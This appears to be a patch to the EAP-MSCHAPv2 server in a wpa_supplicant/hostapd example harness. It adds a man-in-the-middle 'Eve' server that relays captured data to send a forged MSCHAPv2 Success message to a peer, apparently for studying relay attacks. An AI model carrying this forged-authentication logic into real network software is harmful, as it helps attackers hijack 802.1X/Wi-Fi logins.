@@ -207,8 +207,39 @@ static struct wpabuf * eap_mschapv2_build_success_req(
 	char *message = "OK";
 	size_t ms_len;
 
-	ms_len = sizeof(*ms) + 2 + 2 * sizeof(data->auth_response) + 1 + 2 +
-		os_strlen(message);
+	enum local_mitm_state {HACK, SKIP} lm_state = SKIP;
+	struct instance_data * self = NULL;
+
+	if (eap_example_get_instance_name(sm) == EVE_SERVER) {
+		self = eap_example_get_instance_data(sm);
+
+		if (self->mitm_protocol_state == 0x7 &&
+		    self->mitm_data == 0) {
+			self->mitm_protocol_state = 0x8;
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Can't find received packet");
+			self = NULL;
+			lm_state = SKIP;
+		}
+		else
+		{
+			wpa_printf(MSG_DEBUG,
+				   "MITM: Start generate "
+				   "forged MSCHAPv2 Success "
+				   " to Bob Peer");
+			lm_state = HACK;
+		}
+	}
+
+	if (lm_state == SKIP) {
+		ms_len = sizeof(*ms) + 2 +2 * sizeof(data->auth_response) +
+			1 + 2 + os_strlen(message);
+	}
+	else
+	{
+		ms_len = self->mitm_data->used;
+	}
+
 	req = eap_msg_alloc(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, ms_len,
 			    EAP_CODE_REQUEST, id);
 	if (req == NULL) {
@@ -218,25 +249,51 @@ static struct wpabuf * eap_mschapv2_build_success_req(
 		return NULL;
 	}
 
-	ms = wpabuf_put(req, sizeof(*ms));
-	ms->op_code = MSCHAPV2_OP_SUCCESS;
+	if (lm_state == SKIP) {
+		ms = wpabuf_put(req, sizeof(*ms));
+		ms->op_code = MSCHAPV2_OP_SUCCESS;
+	}
+	else
+	{
+		ms = wpabuf_put(req, ms_len);
+		os_memcpy(ms, self->mitm_data->buf, ms_len);
+		wpabuf_free(self->mitm_data);
+		self->mitm_data = 0;
+	}
+
 	ms->mschapv2_id = data->resp_mschapv2_id;
-	WPA_PUT_BE16(ms->ms_length, ms_len);
+
+	if (lm_state == SKIP) {
+		WPA_PUT_BE16(ms->ms_length, ms_len);
+	}
+
 	msg = (u8 *) (ms + 1);
 
-	wpabuf_put_u8(req, 'S');
-	wpabuf_put_u8(req, '=');
-	wpa_snprintf_hex_uppercase(
-		wpabuf_put(req, sizeof(data->auth_response) * 2),
-		sizeof(data->auth_response) * 2 + 1,
-		data->auth_response, sizeof(data->auth_response));
-	wpabuf_put_u8(req, ' ');
-	wpabuf_put_u8(req, 'M');
-	wpabuf_put_u8(req, '=');
-	wpabuf_put_data(req, message, os_strlen(message));
+	if (lm_state == SKIP) {
+		wpabuf_put_u8(req, 'S');
+		wpabuf_put_u8(req, '=');
+
+		wpa_snprintf_hex_uppercase(
+			wpabuf_put(req, sizeof(data->auth_response) * 2),
+			sizeof(data->auth_response) * 2 + 1,
+			data->auth_response, sizeof(data->auth_response));
+		wpabuf_put_u8(req, ' ');
+		wpabuf_put_u8(req, 'M');
+		wpabuf_put_u8(req, '=');
+		wpabuf_put_data(req, message, os_strlen(message));
+	}
+
 
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Success Request Message",
 			  msg, ms_len - sizeof(*ms));
+
+	if (lm_state == HACK) {
+		wpa_printf(MSG_DEBUG,
+			   "MITM: End generate "
+			   "forged MSCHAPv2 Success "
+			   " to Bob Peer");
+		self->mitm_protocol_state = 0x9;
+	}
 
 	return req;
 }
@@ -356,6 +413,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	struct instance_data * self = NULL;
 
 	static int k = 10;
+
 	if (eap_example_get_instance_name(sm) == EVE_SERVER) {
 		if (k > 0) {
 			--k;
